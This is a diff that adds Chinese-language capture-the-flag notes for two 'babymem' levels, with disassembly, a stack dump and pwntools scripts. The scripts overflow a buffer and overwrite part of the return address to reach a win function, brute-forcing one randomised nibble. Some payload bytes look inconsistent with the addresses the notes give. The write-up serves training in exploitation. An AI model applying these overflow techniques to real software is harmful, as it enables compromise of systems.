@@ -495,5 +495,128 @@ p.interactive()
 
 ## level 6
 
+这一关将校验的函数放在了win函数里，反而更方便了。因为覆盖返回的地址可以是任意地址，只需要跳过win函数的校验部分即可。
+
+题目中说是要用objdump来分析，我直接用ida反汇编了。
+
+```asm
+.text:0000000000401C52 55                            push    rbp
+.text:0000000000401C53 48 89 E5                      mov     rbp, rsp
+.text:0000000000401C56 48 83 EC 10                   sub     rsp, 10h
+.text:0000000000401C5A 89 7D FC                      mov     [rbp+var_4], edi
+.text:0000000000401C5D 81 7D FC 37 13 00 00          cmp     [rbp+var_4], 1337h
+.text:0000000000401C64 0F 85 F2 00 00 00             jnz     loc_401D5C
+.text:0000000000401C64
+直接跳转到这里就可以了-->.text:0000000000401C6A 48 8D 3D 7F 14 00 00          lea     rdi, aYouWinHereIsYo            ; "You win! Here is your flag:"
+.text:0000000000401C71 E8 AA F4 FF FF                call    _puts
+.text:0000000000401C71
+```
+
+
+
 ## level 7
+
+这一关，程序的加载基址是随机的，无法通过固定的地址跳转。但是页的大小是`0x1000`，这意味着最后三个十六进制的地址是固定的，可以通过覆盖返回地址的最后两个字节来实现跳转，至于第4个二进制数，只能靠多次运行猜测了。
+
+这里要说一下，这个recv最多是一次性接受`nums`个字节，有一个上限，如果你不确定回显是否在这个范围内的话，最好还是用recvall，这个可以获取到所有的输出，直到`EOF`，但是它接受完之后，就会关闭`tube`。
+
+```asm
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffc02d5d290 (rsp+0x0000) | a0 d2 d5 02 fc 7f 00 00 | 0x00007ffc02d5d2a0 |
+| 0x00007ffc02d5d298 (rsp+0x0008) | 88 e4 d5 02 fc 7f 00 00 | 0x00007ffc02d5e488 |
+| 0x00007ffc02d5d2a0 (rsp+0x0010) | 78 e4 d5 02 fc 7f 00 00 | 0x00007ffc02d5e478 |
+| 0x00007ffc02d5d2a8 (rsp+0x0018) | 00 3a ab 52 01 00 00 00 | 0x0000000152ab3a00 |
+| 0x00007ffc02d5d2b0 (rsp+0x0020) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007ffc02d5d2b8 (rsp+0x0028) | 9a 00 00 00 00 00 00 00 | 0x000000000000009a |
+| 0x00007ffc02d5d2c0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d2c8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d2d0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d2d8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d2e0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d2e8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d2f0 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d2f8 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d300 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d308 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d310 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d318 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d320 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d328 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d330 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d338 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d340 (rsp+0x00b0) | 41 41 41 41 9a 00 00 00 | 0x0000009a41414141 |
+| 0x00007ffc02d5d348 (rsp+0x00b8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d350 (rsp+0x00c0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffc02d5d358 (rsp+0x00c8) | 99 3e e5 1f 75 55 00 00 | 0x000055751fe53e99 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x4141414141414141
+- the saved frame pointer (of main) is at 0x7ffc02d5d350
+- the saved return address (previously to main) is at 0x7ffc02d5d358
+- the saved return address is now pointing to 0x55751fe53e99.
+- the address of win_authed() is 0x55751fe53e71.   <---- 这个3e71的3是会变化的
+
+```
+
+```python
+from pwn import *
+
+
+
+elf = ELF("/challenge/babymem_level7.0") 
+
+p = process("/challenge/babymem_level7.0")
+p.sendline("154")
+
+buffer_size = 152
+payload = buffer_size * b'A' + b'\x99\x3E'
+p.sendline(payload)
+output = p.recv().decode("utf-8")
+p.interactive()
+
+exit()
+
+while True:
+
+    elf = ELF("/challenge/babymem_level7.0") 
+
+    p = process("/challenge/babymem_level7.0")
+    p.sendline("154")
+
+    buffer_size = 152
+    payload = buffer_size * b'A' + b'\x99\x1E'
+    p.sendline(payload)
+    output = p.recvall().decode("utf-8")
+    if "pwn" in output:
+        print(output)
+        p.interactive()
+        exit()
+
+```
+
+```python
+while True:
+
+    elf = ELF("/challenge/babymem_level7.1") 
+
+    p = process("/challenge/babymem_level7.1")
+    p.sendline("90")
+
+    buffer_size = 88
+    payload = buffer_size * b'A' + b'\xAE\x22'
+    p.sendline(payload)
+    output = p.recvall().decode("utf-8")
+    print(output)
+    if "pwn" in output:
+        print(output)
+        exit()
+```
+
+## level 8
+
+
+
+## level 9
 
